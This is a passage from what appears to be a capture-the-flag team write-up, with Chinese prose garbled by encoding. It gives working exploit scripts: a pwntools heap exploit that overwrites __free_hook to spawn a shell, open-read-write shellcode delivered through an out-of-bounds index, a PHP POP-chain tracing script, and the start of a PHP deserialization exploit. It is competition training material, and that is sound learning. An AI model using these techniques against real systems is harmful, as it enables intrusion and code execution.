keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./baby_diary')</span><span class="token comment">#sh=remote('8.140.114.72', 1399)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./baby_diary'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token comment">#context.log_level="debug"</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">)</span>    pause<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x4c60</span><span class="token punctuation">)</span>                      <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>                        delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>                     add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x801</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span>i<span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token punctuation">[</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> p8<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token operator">+</span><span class="token number">0x801</span><span class="token operator">-</span><span class="token number">0x251</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0xfb0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    success<span class="token punctuation">(</span><span class="token string">'leak:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset<span class="token operator">=</span><span class="token number">0x1ebb80</span>    libc_base<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    libc<span class="token punctuation">.</span>address<span class="token operator">=</span>leak_addr<span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>main_arena_offset    success<span class="token punctuation">(</span><span class="token string">'libc:'</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x700</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x17</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token comment">#sh=process("./baby_diary")</span>        sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'8.140.114.72'</span><span class="token punctuation">,</span> <span class="token number">1399</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h2 id="å¼ºç½‘å…ˆé”‹-orw-SOLVED-NN"><a href="#å¼ºç½‘å…ˆé”‹-orw-SOLVED-NN" class="headerlink" title="[å¼ºç½‘å…ˆé”‹]orw | SOLVED | NN"></a>[å¼ºç½‘å…ˆé”‹]orw | SOLVED | NN</h2><p>å¯¹elfæ–‡ä»¶idaæ‰“å¼€ååˆ†æå¯çŸ¥å­˜åœ¨ä¸‹æ ‡è¶Šç•Œå’Œè¾“å…¥æ— é™åˆ¶æ¼æ´ã€‚</p><p>æŒ‡é’ˆæ•°ç»„çš„ä¸‹æ ‡v1æ²¡æœ‰æ£€æŸ¥</p><p>ç›´æ¥å›è½¦ï¼Œå°±èƒ½æ— é™è¾“å…¥ï¼Œæ‘†è„±å¤§å°é™åˆ¶ã€‚</p><p>ç›´æ¥åˆ©ç”¨ä¸‹æ ‡è¶Šç•Œï¼Œç”³è¯·ä¸€ä¸ªchunkåˆ†é…ç»™-25çš„ä½ç½®ï¼Œåœ¨è¾“å…¥shellcodeå®ç°orwï¼Œæœ€åè§¦å‘ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#sh=process('./orw')</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'39.105.131.68'</span><span class="token punctuation">,</span><span class="token number">12354</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./orw'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    shellcode<span class="token operator">=</span><span class="token triple-quoted-string string">'''    xor rax, rax    xor rdi, rdi    xor rsi, rsi    xor rdx, rdx    mov rax, 2    mov rdi, 0x67616c662f2e    push rdi    mov rdi, rsp    syscall    mov rdx, 0x100    mov rsi, rdi    mov rdi, rax    mov rax, 0    syscall    mov rdi, 1    mov rax, 1    syscall'''</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'-25'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flagå€¼ï¼š</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h1><h2 id="pop-mater-SOLVED-Hn13"><a href="#pop-mater-SOLVED-Hn13" class="headerlink" title="pop_mater | SOLVED | Hn13"></a>pop_mater | SOLVED | Hn13</h2><p>ç›´æ¥å†™è„šæœ¬å›æº¯POPé“¾ï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getmVar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    pos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">:</span>pos <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getmMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    mflag <span class="token operator">=</span> <span class="token number">0</span>    mtmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> method <span class="token keyword">in</span> i<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''if "public function " in i:                print("get defination:" )                print(i)                break'''</span>            <span class="token keyword">if</span> <span class="token string">"->"</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"("</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get invocation in line "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mflag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                mVar <span class="token operator">=</span> getmVar<span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span>                tmflag <span class="token operator">=</span> mflag                <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                    <span class="token triple-quoted-string string">'''if mVar + " = " + mVar in mtmp:                        s = ""                        ifexp = lines[tmflag]                        ifexpnum = re.findall("[(](.*?)[)]", ifexp)                        s = s.join(ifexpnum)                        if eval(s):                            print("var has been polluted by method 's ifexp")                            print(ifexp)                            print("----------------------")                            return'''</span>                    <span class="token keyword">if</span> mVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    mtmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tmflag<span class="token punctuation">]</span>                    tmflag <span class="token operator">-=</span> <span class="token number">1</span>                mpos <span class="token operator">=</span> mtmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>                mMethod <span class="token operator">=</span> mtmp<span class="token punctuation">[</span>mpos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>mpos <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"method's method is "</span><span class="token operator">+</span>mMethod<span class="token punctuation">)</span>                <span class="token keyword">if</span> mMethod <span class="token operator">!=</span> <span class="token string">"U710q7"</span><span class="token punctuation">:</span>                    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> mMethod<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get!!!!!!!!!"</span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        mflag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">geteMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> tflag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        <span class="token comment"># æŸ¥æ‰¾æ˜¯å¦æœ‰ç›´æ¥èµ‹å€¼æ±¡æŸ“å˜é‡</span>        <span class="token keyword">if</span> eVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># æŸ¥æ‰¾æ˜¯å¦æœ‰ifè¯­å¥åæ±¡æŸ“å˜é‡</span>        <span class="token triple-quoted-string string">'''if eVar+" = "+eVar+"." in tmp:            s = ""            ifexp = lines[tflag]            ifexpnum = re.findall("[(](.*?)[)]", ifexp)            s = s.join(ifexpnum)            if eval(s):                print("var has been polluted by ifexp")                print("----------------------")                return'''</span>        tmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tflag<span class="token punctuation">]</span>        tflag <span class="token operator">-=</span> <span class="token number">1</span>    mpos <span class="token operator">=</span> tmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>    method <span class="token operator">=</span> tmp<span class="token punctuation">[</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eval's method is "</span> <span class="token operator">+</span> method<span class="token punctuation">)</span>    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No FOUND"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geteVar</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    epos <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">[</span>epos <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">:</span>epos <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">geteval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-------------------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get eval in line"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", total:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>                eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eVar is "</span> <span class="token operator">+</span> eVar<span class="token punctuation">)</span>                geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>                num <span class="token operator">+=</span> <span class="token number">1</span>            flag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>            epos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>            eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>            <span class="token keyword">break</span>        flag<span class="token operator">+=</span><span class="token number">1</span>geteval<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag{42a17bce-75b3-4e4e-a073-e5ec1bb4a218}</p><h2 id="èµŒå¾’-done-Err0r"><a href="#èµŒå¾’-done-Err0r" class="headerlink" title="èµŒå¾’ | done | Err0r"></a>èµŒå¾’ | done | Err0r</h2><p>æ‰«ç›®å½•å‘ç°<code>www.zip</code></p><p>å‘ç°æ˜¯ååºåˆ—åŒ–ï¼Œexpï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"give you flag : "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token 